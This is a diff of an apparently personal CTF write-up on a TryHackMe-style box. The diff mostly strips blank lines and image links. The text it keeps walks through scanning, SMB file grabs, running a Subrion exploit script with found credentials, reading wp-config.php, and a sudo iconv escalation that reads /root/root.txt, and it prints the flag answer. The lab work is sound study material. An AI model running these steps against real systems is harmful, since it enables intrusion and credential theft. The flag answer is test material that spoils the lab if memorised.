@@ -6,7 +6,6 @@ Hack into the scammer's under-development website to foil their plans.
 
 Hack into the machine and investigate the target.
 
-
 ```
 ┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
 └─$ nmap -sC -sV 10.10.61.64                   
@@ -69,8 +68,6 @@ PING 10.10.61.64 (10.10.61.64) 56(84) bytes of data.
 rtt min/avg/max/mdev = 193.894/195.072/196.053/0.677 ms
 
 There is a small trick to identify the OS (operating system) without nmap by using ping (yes ping) . By checking the ttl (Time to live) by default windows has a ttl(Time to live) of 128 and for Linux it’s something in the range of 64.
-
-
 
 ┌──(kali㉿kali)-[~/Downloads]
 └─$ feroxbuster --url http://10.10.61.64 -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403
@@ -147,7 +144,6 @@ smb: \> get enter.txt
 getting file \enter.txt of size 273 as enter.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
 smb: \> exit
 
-
 ┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
 └─$ cat enter.txt      
 GOALS
@@ -194,11 +190,9 @@ File Type: Python script, ASCII text executable, with very long lines (956)
 
 Copied to: /home/kali/Downloads/hacker_vs_hacker/49876.py
 
-
 http://10.10.61.64/subrion/panel/
 
 log in
-
 
 ┌──(kali㉿kali)-[~/Downloads/hacker_vs_hacker]
 └─$ python3 49876.py -u http://10.10.61.64/subrion/panel/ -l admin -p Scam2021
@@ -271,7 +265,6 @@ license.txt      wp-comments-post.php  wp-links-opml.php  wp-signup.php
 readme.html      wp-config.php         wp-load.php        wp-trackback.php
 wp-activate.php  wp-content            wp-login.php       xmlrpc.php
 wp-admin         wp-cron.php           wp-mail.php
-
 
 www-data@TechSupport:/var/www/html/wordpress$ cat wp-config.php
 cat wp-config.php
@@ -391,26 +384,13 @@ User scamsite may run the following commands on TechSupport:
 
 https://gtfobins.github.io/gtfobins/iconv/
 
-
 scamsite@TechSupport:~$ sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"
 sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"
 851b8233a8c09400ec30651bd1529bf1ed02790b  -
 
 ```
 
-
-![[Pasted image 20220924143129.png]]
-
-![[Pasted image 20220924143905.png]]
-
-![[Pasted image 20220924144133.png]]
-
-
 What is the root.txt flag?
 *851b8233a8c09400ec30651bd1529bf1ed02790b*
-
-
-
-
 
 [[b3dr0ck]]
